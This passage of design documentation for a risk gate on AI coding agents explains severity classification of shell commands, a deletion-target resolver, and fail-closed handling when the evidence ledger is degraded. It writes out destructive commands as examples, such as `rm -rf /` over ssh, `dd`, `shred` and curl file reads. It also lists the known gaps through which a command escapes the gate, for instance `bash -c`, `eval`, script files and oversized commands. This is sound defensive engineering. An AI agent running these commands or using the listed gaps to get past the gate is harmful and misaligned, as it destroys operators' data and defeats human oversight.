   and only flags proven to name no file, with the only selectable
   method being HEAD, which is read-only),
   and the existing `git` read verbs
   (`status`, `log`, `rev-parse`, `rev-list`, `show`, `diff`, `branch`
   without `-D`/`-d`, `ls-files`, `remote -v`, `fetch`), including their
   `git -C <dir>` path-qualified spellings.
   Being explicitly `low` (not merely unclassified) is what actually
   removes these from `gate-prod-destructive`'s scope: the softened
   fallback alone would already do that for the critical threshold, but
   a floor also removes them from any `severity_at_least:
   high`/`medium`/`low` policy, which the softened fallback does NOT.

   `ssh <host> <cmd>` and `node -e`/`--eval` are deliberately NOT given
   this floor, even though the motivating incident included exactly
   these shapes. Their payload is opaque to a regex-and-argv-token
   classifier: the remote command in `ssh <host> "<cmd>"` and the
   evaluated code in `node -e "<code>"` are both unexamined strings the
   classifier cannot reason about, so a `low` floor would grant the
   strongest exemption (removed from every `severity_at_least` tier, not
   just `critical`) to a head whose actual behavior is unbounded:
   `ssh prod-host "rm -rf /"` or `node -e "<destructive JS>"` would then
   pass with zero friction.

   `curl` sits between the two groups above. Decision D-013 (task
   `2929c5b7`) first left it fully unclassified for a MEASURED reason
   rather than an opaque payload: its flag surface could not be
   allowlisted robustly, because a curl invocation's write capability
   depends on flags and flag VALUES that change between curl versions.
   Two floors shipped for it and both leaked, most recently on
   `-w '%output{FILE}'`, which writes a local file since curl 8.3.0, and
   `-H @FILE`, which reads a local file into the request from the value
   side. Task `fdaad781` (decision D-026) closes that gap not by
   re-litigating the flag list but by narrowing the SHAPE instead: a
   `curl` invocation floors `low` only when it fits the closed grammar
   in "curl read-only SHAPE floor" above, and every other curl spelling
   -- including any flag nobody has reasoned about here -- still forfeits
   to genuinely unclassified, riding the same fallback described next.
   See that section above for the full history and for the operator
   escape hatch: an explicit `low` classifier pattern for a broader curl
   shape a deployment knows is safe, or a network egress control.

   `ssh`, `node -e`, and every curl spelling this floor's shape does not
   cover stay genuinely unclassified, and ride prong 2's fallback alone: a
   production-scoped `gate-prod-destructive` (`severity_at_least:
   critical`) does not hard-block them (an unclassified action sits at
   the "high" rung, not "critical"), but a production-scoped
   `gate-prod-destructive-approval` (`severity_at_least: high`) still
   requires operator approval before any of them runs. Approval-gated,
   never hard-blocked, never silently allowed. If a deployment wants
   `ssh`/`node -e`/an unfloored `curl` hard-blocked instead, add an
   explicit `critical` classifier pattern for the specific invocation
   shapes that deployment cares about (an operator classifier composes
   with, and can only RAISE
   above, the fail-closed fallback).
2. **The comparably-destructive mutating heads are now explicitly
   classified**, at the severity the shipped classifiers already use for
   a comparable action. This ships as the BUILT-IN destructive floor
   (`src/runtime/destructive-shell-floor.ts`, see "Built-in destructive
   floor" above for the full table), so it takes effect for an EXISTING
   install on upgrade rather than only for a manifest that adopts the new
   template patterns. `critical`, comparable to `rm -rf` and `terraform
   destroy`: `dd` with an `of=` target, `truncate -s`, `shred`, `mkfs`,
   `find ... -delete`, `find ... -exec(dir) rm`. `high`, comparable to
   `DROP TABLE` and `kubectl delete`: `git reset --hard`, `git push
   --force`, `git clean -f`, `git checkout .`, `git restore .`, `chmod`/
   `chown -R`, `sed -i`, and a `curl` that writes a local file (including
   via `-w '%output{FILE}'`), sends a body, or reads a local file into the
   request with an `@FILE` value on `-H`/`-b`. The `dangerous-shell` patterns in
   `docs/examples/full-manifest.yaml` and `src/cli/init/templates.ts`
   (kept in lockstep by `tests/cli/init-full-template-parity.test.ts`)
   are the operator-editable mirror of that floor.

   **Known, disclosed boundary, NOT closed by this task:** a truncating
   redirection (`cat x > /etc/y`, or any bare `>` write) is recognized
   neither by a classifier pattern nor by the built-in floor. The
   patterns are plain regexes over the raw command string, and the floor
   has no redirection model either, so a heuristic for a bare `>` would
   have an unacceptable false-positive rate against `2>&1`, heredocs, and
   comparison operators inside scripts. This gap already existed before
   task `2929c5b7`: a redirected write was always either caught by an
   operator-authored pattern or fell to the fail-close. What changed is
   that the fail-close itself is now weaker at the critical tier, so an
   UNCLASSIFIED redirected write is risk-bearing at `high`
   (approval-required) rather than `critical` (hard-blocked) at this
   specific gate. Add a deployment-specific classifier pattern for a
   redirect shape that matters to your production targets if this
   residual gap is unacceptable for your policy.

**No manifest opt-in to restore the pre-`2929c5b7` "unclassified
satisfies `severity_at_least: critical`" behavior exists.** None was
found in the schema before this task, and this task did not add one. If a
deployment wants the stricter, pre-fix posture back, the fix is a
tightened `environment.name`-scoped policy at `severity_at_least: high`
(already fail-closed on unclassified) or an explicit `critical` pattern
for the specific action that deployment cares about, not a global knob.

**The footgun:** a policy that gates on `risk.*` or `action.reversible`
clauses WITHOUT an `environment.name` scope fires on every unclassified
command in every environment. A command the classifier does not recognise
satisfies the risk clause by fail-close, and with no environment scope
the policy never gets to exclude non-production sessions.

**The correct pattern** is to pair any risk clause with an
`environment.name` scope:

```yaml
policies:
  - name: deny-unclassified-in-production
    description: >
      Block unrecognised commands in production. Without environment.name,
      this policy would fire on every unclassified command in every
      environment because the fail-closed unclassified rule makes
      risk.severity_at_least match anything the classifier did not
      recognise. The environment.name clause restricts the gate to the
      session that actually resolves to production.
    trigger:
      event: PreToolUse
      match: Bash
    when:
      risk.severity_at_least: high          # also fires fail-closed on unclassified
      environment.name: production          # REQUIRED: scopes to production only
    requires:
      ledger_tag: "risk-approved:${SESSION_ID}"
    hook: risk-gate
    enforcement: block
```

Without `environment.name: production`, the policy above would fire on
every Bash call the classifier does not recognise, in every environment,
including local development sessions on non-production branches.

**`harness validate` warns on the footgun.** A policy with any of
`risk.severity_at_least`, `risk.category_in`, or `action.reversible` in
its `when:` block but no `environment.name` clause produces a
`severity: "warning"` diagnostic pointing at this section.

**The audit record and block-time deny message now flag the footgun.** When
a policy fires because the action was unclassified (not because the
classifier returned a real match), the `PolicyDecision` record carries
`whenUnclassifiedFallback: true`. This field is serialised into the
`policy_decision` ledger row and surfaces as follows:

- **`harness audit` (table):** the `reason` column is annotated with
  `[unclassified-fallback]` so a fail-closed match is immediately visible
  in the human-readable table.
- **`harness audit --json`:** the `whenUnclassifiedFallback: true` field
  appears on the JSON decision object, enabling programmatic inspection.
- **`harness explain <policy> --trace --json`:** the `whenUnclassifiedFallback`
  field appears in the JSON trace projection, letting an operator or
  script distinguish a fail-closed unclassified deny from a real
  critical-severity match.
- **Block-time deny message (non-`ux:` policies):** the deny reason
  appends `(matched via the fail-closed unclassified rule, not a real risk
  classification)` before the hint suffix so the agent-facing message
  identifies the cause at a glance.
- **Block-time deny message (`ux:` policies, since task `2929c5b7`):**
  when the deny is caused by the fallback, a sentence is PREPENDED to the
  operator's own `cannot:` text, followed by the `cannot:`/`required:`/
  `run:` text exactly as the operator wrote it (added to, never
  replaced). Everything variable in that sentence is interpolated from
  the decision, not hard-coded: the RESOLVED environment name, the
  fallback rung, and the policy's OWN declared threshold. On a
  production-resolved session gated by `severity_at_least: critical` it
  reads "This is an unclassified action in a production context: no risk
  classifier pattern recognized it, so the fail-closed severity fallback
  (treated as high) satisfied this policy's severity_at_least: critical,
  rather than a genuine critical-severity match."; an unscoped
  `severity_at_least: high` policy on a feature branch names that
  environment and that threshold instead. A policy that set the flag
  through `risk.category_in` / `action.reversible` (which keep the
  blanket fallback) and declares no `severity_at_least` gets the
  threshold-free wording. Before this task, a `ux:`-declared policy's
  `cannot:` text was rendered completely unchanged for a fallback-caused
  deny, so `gate-prod-destructive`'s own "You cannot run this critical
  destructive action against production." was shown verbatim for an
  unrecognized READ the moment the environment resolved to production,
  the exact false positive this task exists to fix. A genuine
  classification hit (e.g. `rm -rf /x`) still renders the operator's
  `cannot:` text with NO prefix, unchanged from before.

Both the ux and non-ux block-time messages are driven by the same
`whenUnclassifiedFallback` flag on the `PolicyDecision`; only the wording
differs by surface.

### Dev-context deletion gate (`action.deletion_target_unresolvable`)

*Status: live as of task `d03af8f6`. Additive alongside
`gate-prod-destructive`/`gate-prod-destructive-approval`; nothing about
those two policies changed. For the round-by-round measured gaps and
fixes, see `CHANGELOG.md`'s `d03af8f6` entry — this section states the
current rule only.*

`gate-prod-destructive`/`-approval` gate on `risk.severity_at_least` +
`environment.name: production`, so on an ordinary task branch —
`environment: unknown` — neither fires: an `rm -rf`, `find ... -delete`,
or `git clean -f*` runs unconfirmed even when its target is a typo'd
path, a stray shell variable, or a relative path that resolves somewhere
other than where the agent thinks it does. The motivating incident class
is not "an agent attacks production" but "an agent cleans up its own
scratch files and the path points elsewhere."

This gate closes that gap WITHOUT scoping to production, using a
DIFFERENT mechanism than the four `risk.*`/`environment.*` clauses above:

- **`src/runtime/deletion-target-resolve.ts`** recognizes a deletion verb
  — `rm` (bare or path-qualified, e.g. `/bin/rm`) with a recursive
  (`-r`/`-R`/`--recursive`) or force (`-f`/`--force`) flag; `find ...
  -delete` or `find ... -exec`/`-execdir`/`-ok`/`-okdir` whose payload
  is `rm`; or `git clean` (bare or path-qualified `git`, its own global
  options skipped) with a force flag (`-f`/`--force`/a short cluster
  containing `f`) or with a `clean.requireForce` config override
  anywhere in the command text (`git -c clean.requireForce=false clean`,
  `GIT_CONFIG_PARAMETERS=...`, `git config clean.requireForce false &&
  ...` — read from the raw command, because `command-normalize.ts`
  canonicalizes `git -c k=v clean` to `git clean`) — across **every
  shell segment named by either of `command-normalize.ts`'s
  segmentation arms**: `segmentViewOf` (the primary alphabet — `;`,
  `&&`, `|`, `(`, newline) AND `segmentViewOfAmpAware` (the same alphabet
  plus a bare `&`), each walked in command order. Within one arm, a
  `find`-headed segment's search roots are carried into a directly
  following segment headed by a `find` primitive — `;` is a segment
  boundary, so `find <root> -exec echo {} \; -exec rm -rf {} \;` and
  the escaped grouped expression `find <root> \( -name a -o -name b \)
  -delete` put the deleting primitive in a segment of its own. Per
  segment, a leading `cd <path> &&`/`VAR=value` prefix is skipped, a `#`
  word starts a comment and ends the segment, and a leading run of
  keywords and group markers that precede a command (`if`, `then`,
  `else`, `elif`, `while`, `until`, `do`, `!`, `{`, `)`, `){`) plus a
  trailing `}`/`;` token, a trailing `)` glued to the last token, and a
  trailing bare `&` are stripped. A wrapper in front of the verb —
  `sudo`, `doas`, `command`, `env` (consuming its `VAR=value` args and
  `-i`/`-u`/`-C` flags), `time`, `timeout` (consuming its own flags plus
  the duration arg), `nice` (`-n <n>`, `-<n>`, `--adjustment=<n>`),
  `stdbuf`, `setsid`, `nohup` — is peeled with `command-normalize.ts`'s
  own exported `peelWrapperPrefixes` (the SAME loop the
  `git`/`gh`/`npm`/`harness` trigger recognizer uses); `exec` (with its
  `-a <name>` value), the multi-call binaries `busybox`/`toybox`, and
  `xargs` are peeled locally. **`xargs` rule:** after the `xargs` token
  (bare or path-qualified), a bounded forward scan finds the first token
  that is itself a recognized deletion-verb head, with no parsing of
  `xargs`'s option vocabulary; when one is found, the invocation is
  **unresolvable regardless of any explicit operand** — `xargs` appends
  or substitutes stdin-supplied operands at runtime, never statically
  knowable, so `xargs rm -rf /tmp/known` gates exactly like `xargs rm
  -rf` (the verdict lists a synthetic `(xargs-supplied target, not
  statically known)` entry first, then any explicit operand, none of
  them resolved). The scan does not stop at an intervening non-verb
  word, so `xargs echo rm -rf /home/x` (which only prints) is gated too
  — an accepted over-gate. Every token is decoded with `decodeShellWord`
  (`src/runtime/shell-word.ts`) before any verb/flag/`-delete`
  comparison, so a flag hidden behind quote concatenation or an ANSI-C
  escape (`find /x $'\x2ddelete'`) is still recognized; the raw
  tokenizer honours quotes and a backslash escape, so `rm -rf /tmp/x\ y`
  is one operand, as it is for bash. No regex with a nested quantifier
  is used anywhere in this module — a whitespace/quote-aware tokenizer
  plus a small set of bounded, non-nested patterns (the
  `/^(?:\S*\/)?rm$/` head pattern, the redirection-operand pattern
  below, ...), so there is no ReDoS surface to measure here. A chained
  command's verdict is the OR of every recognized segment's:
  **unresolvable if ANY recognized segment is, resolved only if ALL of
  them are.**
- **Targets per verb.** `rm`: every operand after the flags (`--` ends
  flag parsing; a bare `(`/`)` token is subshell syntax, never an
  operand). `find`: its search-root operands (leading `-P`, `-E`, `-X`,
  `-d`, `-s`, `-x`, `-O<n>`, `-D <opts>` skipped, BSD `-f <path>`
  contributing its path; collection stops at the first `!` or
  `-`-prefixed token; `.` when none is given) PLUS, for each
  `-exec`/`-execdir`/`-ok`/`-okdir rm ...` payload, the payload's own
  explicit operands — every non-flag token other than the exact `{}`
  placeholder, up to a `+` terminator or the end of the segment (the `;`
  terminator is a segment boundary; the escape or quote character it
  leaves behind is dropped) — so `find /tmp/x -exec rm -rf /home/y \;`
  gates on `/home/y`. A leading `-H`/`-L` or the `-follow` primary makes
  the whole `find` verdict unresolvable: `find` would follow a symlink
  out of the root. `git clean`: its pathspecs (`-e`/`--exclude` consume
  their value; `.` when none is given); a bare `-n`/`--dry-run`
  invocation without a force flag stays unrecognized, since git refuses
  to delete.
- Each target token is resolved STATICALLY — no filesystem I/O, no
  process-env read, no shell-variable expansion, no cwd substitution. A
  redirection operand (`>`/`>>`/`<`/`<<`/`<<<`/`>&`/`<&`/`&>`/`&>>`,
  glued or bare, with an optional leading fd number — `>/dev/null`,
  `2>&1`, `< list`) is dropped before target collection in every
  resolver; when the token is the bare operator (nothing glued to it)
  the following, whitespace-separated filename token is dropped too, and
  collection stops at a bare `&`. A surviving token is **resolved** only
  when ALL of the following hold; each failing check is a closed class,
  never an instance:
  - it contains no `$` (an unexpanded variable or `$(...)`
    substitution), no backtick (command substitution), and no `{`
    (brace expansion — `/tmp/{..,x}` expands to `/tmp/..` — or an
    `xargs`/`find` placeholder);
  - it starts with `/` (a relative path, and every `~`-prefixed token
    since `~` is never `/`-prefixed, is unresolvable — this resolver
    deliberately does not consult the event's cwd);
  - it does not end in `/` or `/.`: a trailing slash makes `rm` and
    `find` follow a symlinked directory into its target (measured on
    macOS: `rm -rf <link>/` removed the link's TARGET directory);
  - no path component is `..`: a lexical collapse assumes no component
    is a symlink, but `/tmp/<link>/../y` physically resolves relative
    to the link's target, so `rm -rf /tmp/a/../b` is unresolvable even
    though it lexically normalizes back inside the root;
  - no path component is a glob that can expand to `..` — a component
    starting with an explicit `.` whose remainder can match a single
    `.` (`.*`, `..*`, `.?`, `.[.]`, `.[!x]`; measured on bash 3.2, with
    and without `dotglob`, bash matches `.`/`..` only against an
    explicit leading dot, so `*`, `[.][.]`, and the safe idioms `.[!.]*`
    / `.??*` cannot, and `rm -rf /tmp/x/*.log` stays resolvable);
  - its final path segment is not a bare `*`/`**` (`rm -rf /tmp/*`
    names "whatever the directory currently contains," not a specific,
    provably-safe path);
  - when the command contains an extglob opener (`?(`, `*(`, `+(`,
    `@(`, `!(`), it does not end in one of those characters — the `(`
    is a segment boundary, so the token is the cut-off pattern head;
  - after `.`/`//` normalization it lies **strictly inside** one of the
    `risk.safe_deletion_roots` entries as a directory-prefix match (the
    root path ITSELF does not count: `rm -rf /tmp` and `find /tmp -name
    '*.log' -delete` are unresolvable, `find /tmp/scratch ...` resolves)
    — for EVERY recognized verb alike.
- **Known ceilings (not covered, deliberately, pinned as tests rather
  than left implicit):** `bash -c '...'`/`sh -c '...'`/`env -S '...'`/
  `find ... -exec sh -c '...'` (the wrapped command lives inside a string
  argument this resolver does not parse into), and more generally any
  `find -exec`/`-execdir`/`-ok`/`-okdir` payload whose head is not `rm`
  (`xargs rm -rf {} +`, `bash -c`, `perl -e`), which is not recognized as
  a deletion at all; a backslash-newline line continuation
  (`rm -rf \<newline>/tmp/x`) over-gates because the newline is a
  segment boundary (fail-closed); `eval "..."` (same reason
  — a string to be re-parsed, not a positional "command to run"); a
  script FILE the agent writes and then executes (`sh script.sh`) — this
  resolver never reads a file's contents; `shred`/`rmdir`/`unlink` —
  real deletion-shaped verbs outside this resolver's closed head-token
  set (`rm`/`find`/`git clean`); `npm run clean` or any other
  script/Makefile/CI job whose NAME suggests deletion — this resolver
  inspects the literal command line only, never a script's own body;
  `` `rm -rf /home/x` `` (backtick command substitution — the deletion
  command lives inside a substitution this resolver does not parse
  into); a grouped `find` expression with QUOTED parentheses (`find
  /home '(' -name a ')' -delete`) — `(` is a quote-unaware segment
  boundary and the cut lands inside the quoted run, so the continuation
  segment's tokens are mis-quoted (the escaped `\( ... \)` spelling IS
  covered); a `case` arm (`case x in *) rm -rf /home/x;; esac`) — the
  arm's pattern and `)` are glued to the command's own segment head;
  runners outside the peeled wrapper set that hand their argv to
  another program (`parallel`, `ionice`, `chrt`, `taskset`,
  `caffeinate`, `flock <file>`, `strace`, `ssh <host>`, `docker exec
  <c>`, `chroot <dir>`, `su -c`, `watch`); a symlink inside a root that
  points outside it when the command names the link WITHOUT a trailing
  slash (`rm -rf /tmp/link/y` deletes `<target>/y` — only the
  trailing-slash and `..` spellings are lexically visible); a
  `clean.requireForce=false` git config set OUTSIDE the command text
  (repository config, an earlier command); any command past
  `MAX_NORMALIZE_LENGTH` (100,000 characters, `command-normalize.ts`) —
  the resolver falls back to inspecting only the FIRST shell segment, so
  a recognized deletion verb in a LATER segment of such an oversized
  command goes unrecognized. Reporting-only ceiling: the amp-aware arm
  is quote-unaware, so a quoted literal `&` inside an operand (`rm -rf
  '/tmp/a&b'`) is listed twice — once whole, once cut at the `&` — and
  the cut spelling is unresolvable (a fail-closed over-gate on that
  shape, never a missed deletion).
- **`risk.safe_deletion_roots`** (new manifest key, under `risk:`
  alongside `classifiers:`) is the allowlist those absolute targets are
  checked against:

  ```yaml
  risk:
    safe_deletion_roots:
      - /tmp
      - /private/tmp
  ```

  Schema default is exactly this list — the two spellings this
  harness's own scratchpad convention can use: on macOS `/tmp` is a
  symlink to `/private/tmp`, and different tools report the target
  under either spelling. An operator-declared list REPLACES the
  default, it does not merge with it. An entry may end in a trailing
  `/**` or `/*` as documentation sugar (stripped before matching); this
  is a plain directory-prefix check, not a real glob engine. An entry
  that lexically NORMALIZES to the filesystem root — a bare `/`, any run
  of `/` characters, or anything a `.`/`..`-collapse reduces to nothing
  (`/.`, `/./`, `/tmp/..`) — is a schema parse error: it would match
  every absolute path, silently defeating the allowlist. A non-absolute
  entry, or one containing a literal `$` or `~` (this resolver never
  expands either), is a `harness validate` warning instead — the
  resolver still fails CLOSED for the target that entry was meant to
  cover, so it is a usability lint, not a security gap needing a
  parse-time refusal.
- **`when.action.deletion_target_unresolvable: true`** (new `when:`
  clause; only the literal `true` is a meaningful value — the schema
  rejects `false`, since a chained non-deletion command would otherwise
  match it via the resolver's `null` verdict) reads the verdict above.
  Unlike `risk.severity_at_least` / `risk.category_in` /
  `action.reversible`, this clause is **never** subject to the "unknown
  is not safe" fail-close described below: an action the deletion
  resolver does not recognize as a deletion verb at all
  (`deletionTarget === null`) simply does not satisfy `true` here — it
  never falls back to matched=true the way the risk-derived clauses do
  for an unclassified action. This is deliberate and load-bearing: those
  clauses fail-close because "we could not classify this generic action"
  is itself risk-bearing, but doing the same for THIS clause would turn
  an unscoped policy into a blanket gate on every unrelated unclassified
  Bash call, in every environment — approval-spam, not a
  deletion-specific gate. Because the clause is exempt, the shipped
  `gate-dev-unsafe-deletion` policy below needs no `environment.name`
  scope, and `harness validate`'s footgun lint
  (`checkPolicyRiskWithoutEnvScope`, "Unclassified actions and the
  fail-close rule" below) does not fire on it — that lint only inspects
  `risk.severity_at_least` / `risk.category_in` / `action.reversible`.
- **`gate-dev-unsafe-deletion`** (new policy, shipped in
  `harness init --template full` and `docs/examples/full-manifest.yaml`,
  additive next to `gate-prod-destructive`/`-approval`): `require_approval`
  on `action.deletion_target_unresolvable: true`, no `environment.name`
  clause. It consults its **own** ledger tag,
  `risk-approved:deletion:${SESSION_ID}` — a SEPARATE tag from
  `gate-prod-destructive-approval`'s `risk-approved:${SESSION_ID}`.
  `harness approve risk --scope deletion` writes it; the bare `harness
  approve risk` (no `--scope`) keeps writing only the production tag.
  This is deliberate: an earlier revision of this gate shared the
  production tag, so approving one routine dev-context `rm -rf dist`
  silently cleared `gate-prod-destructive-approval` for the rest of the
  session (measured incident in `CHANGELOG.md`'s `d03af8f6` entry). Like
  the production tag,
  the deletion tag's approval lifetime is session-wide (a deliberate DX
  trade-off, not a bug): one operator approval clears it for every
  subsequent unresolvable deletion in that session, not just the one
  that triggered it.
- **Deny-first order is unaffected.** `gate-dev-unsafe-deletion` is
  listed AFTER `gate-prod-destructive`/`-approval` in both shipped
  manifests. When environment resolves to `production` AND the target is
  both `critical`-severity (dangerous-shell) AND outside every safe root,
  `gate-prod-destructive`'s hard `deny` is still the first blocking
  decision `intercept()` finds — this gate never downgrades an existing
  production deny to a mere approval prompt.

**Adopting this on an existing install.** `harness apply`/`init` never
retroactively add a newly-shipped default policy to an
already-materialized `harness.yaml` (see "Version history that matters"
in `docs/okf/policy-engine-producer-wiring.md` and
`checkTemplatePolicyDrift`'s own doc comment) — an install from before
task `d03af8f6` does not gain this gate just by upgrading the `harness`
package. To add it by hand: copy the `gate-dev-unsafe-deletion` policy
block from `docs/examples/full-manifest.yaml` into your `policies:` list,
and add a `risk.safe_deletion_roots` block (or rely on the schema
default `["/tmp", "/private/tmp"]` if that already covers your scratch
convention) — `harness validate` will flag a malformed roots entry (see
above) once it is in place.

Inspect the resolver's verdict directly with
`harness explain-policy gate-dev-unsafe-deletion --event <event.json>`:
the projection's `deletion_target` field shows the recognized verb,
every target (across every recognized segment, when a chained command
names more than one), which targets were unresolved, and why.

## Decision model

*Status: all four outcomes are evaluated and enforced as of Phase 7 #6.
`deny` and `require_approval` abort the tool call; `allow` and `warn`
let it proceed.*

The Phase 4 decision space is `allow` / `deny`, selected by
`enforcement: block | warn`. Phase 7 extends it to four outcomes, with
`require_approval` added as a third `enforcement` value:

| Decision | Meaning |
|---|---|
| `allow` | Action may proceed. |
| `warn` | Action proceeds; a warning is recorded and surfaced. |
| `require_approval` | Action is blocked until matching approval evidence exists in the ledger. |
| `deny` | Action is blocked. |

**Degraded mode.** (Revised by task f1aea826; the paragraph below replaces
the original fail-open-for-every-tier contract.) When the evidence ledger
cannot answer (grounding-mcp absent, unresponsive, or past its timeout
budget), the evaluator cannot form a real verdict — and what happens next
is now derived from the policy's own `enforcement:`. A `warn` policy
degrades to the non-blocking `warn-degraded` exactly as before:
advisory friction never bricks the session. A `block` or
`require_approval` policy fails CLOSED with the blocking `deny-degraded`
outcome: a gate whose purpose is preventing a specific irreversible
incident must not open because its evidence became unreadable (measured
2026-08-06: a 1-100ms ledger timeout flipped a `git push` deny to ALLOW
while every broken-ledger-path shape correctly denied). The
`deny-degraded` envelope names the degraded cause instead of a missing
tag — producing the required evidence cannot unblock an unreadable
ledger — plus the operator-facing recovery path (`harness doctor`,
retry). The opt-out is deliberately NOT named in the agent-facing
envelope (a deny that includes its own disable recipe is not a gate);
it appears on the stderr diagnostic and in this doc.

The audit row is best-effort, stated precisely: when the ledger is
reachable at all, the row lands — if necessary via ONE fresh-session
retry reserved for `deny-degraded` rows, whose own per-call budget is
max(250ms, timeoutMs/4) — two calls (initialize + ledger_add), so the
added stall is at most half a timeout once the ledger timeout is >=1s;
below that the 250ms floor dominates and the add is bounded at 500ms
absolute. A write that survives the retry is reported on stderr and
never changes the decision. With grounding-mcp absent from the manifest
altogether there is no transport and therefore no audit row at all: the
deny is visible only in the envelope and a dedicated "has NO audit row"
stderr line.

Operators who prefer the previous availability-first behaviour set
`risk.degraded_fail_posture: fail_open` in the manifest, which restores
the old mapping (every degraded evaluation → non-blocking
`warn-degraded`) for every tier. The default is `preserve_enforcement`.

Boundaries this contract cannot reach: the OUTER hook layer treats a
hook that exceeds its own `budget_ms` as allow (harness hook contract),
so hook budgets must stay comfortably above the ledger timeout or the
fail-closed decision is never delivered; malformed event JSON and a
failed manifest load remain allow-with-stderr at the CLI wrapper, so
the posture is only as fail-closed as manifest integrity; and a wedged
fail-closed gate whose fix itself needs the gate (the deadlock case,
task 78b95a63) has two designed escapes: the `fail_open` opt-out and
the operator-only `harness pause` kill switch, which is honoured BEFORE
manifest load and therefore silences the policy gates even when the
manifest or ledger is exactly what is broken.

One adjacent liveness note: the policy schema also admits
`Stop`/`SubagentStop`/`UserPromptSubmit` triggers. A block-tier policy
on such an event would, under a persistently degraded ledger, emit its
block on every attempt — the same deadlock family as above, escaped the
same two ways. No shipped template policy uses those events.

`require_approval` reuses the Phase 6 approval mechanism unchanged: a
ledger tag (working name `risk-approved:${SESSION_ID}`) written by a
`harness approve` verb and read by the existing requires-evaluator. This
is the same pattern as `understanding-approved:${SESSION_ID}`. It is why
`agent-grounding` needs no new code: it already stores arbitrary tags
through `ledger_add`.

## Open questions, resolved

The source design closes with seven open questions. The four that gate
Phase 7's shape are resolved here; the remaining three are deferred with
a reason.

- **Risk Gate inside harness, or a separate `risk-gate` CLI?**
  Inside harness. The classifier and resolver consume `harness.yaml`;
  `policy intercept` is already the `PreToolUse` runtime path. A
  separate CLI would only re-import the harness manifest schema for no
  benefit at this scope.
- **Inline policies, imported bundles, or both?**
  Inline for Phase 7, consistent with the Phase 4 decision (ROADMAP
  "Open decisions resolved here" §4): runtime-firing policies live in
  `harness.yaml policies:`. `risk.classifiers[]` and
  `environments.resolvers[]` are likewise inline. Bundling is a v2
  concern.
- **How is explicit approval represented in the ledger?**
  As a ledger tag, reusing the Phase 6 pattern. No new evidence
  primitive, no `agent-grounding` change.
- **Production detection: deny-by-default or approval-by-default?**
  Approval-by-default for `high`, deny-by-default for `critical`
  production actions, and `require_approval` for `unknown`. This is the
  built-in `dangerous-shell` policy's stance (Phase 7 #6); operators
  override per policy. Rationale: a `critical` production mutation
  (`terraform destroy`, `rm -rf /var/lib/...`) has no benign reading, a
  hard `deny` is correct; a `high` action may be legitimate with an
  approval on record.
- **Break-glass / temporary override:** deferred. Out of scope for
  Phase 7; tracked as a future open question.
- **Deterministic rules vs LLM-assisted classification:** deterministic
  rules only for Phase 7. LLM-assisted review is a v2+ knob.
- **Cross-runtime support (OpenCode, Codex, custom MCP runtimes):**
  deferred. Phase 7 targets the Claude Code `PreToolUse` surface; the
  envelope shape is designed to be runtime-neutral, but adapters are a
  later effort.

## See also

- [`docs/ROADMAP.md` Phase 7](ROADMAP.md#phase-7-risk-gate) for the
  six-sub-task decomposition.
- [`docs/ARCHITECTURE.md` §6](ARCHITECTURE.md) for the
  `policies:` / `requires:` / `grounding-mcp` wiring the Risk Gate
  composes on top of.
- `docs/examples/full-manifest.yaml` for a worked `dangerous-shell`
  classifier and `production-signals` resolver.
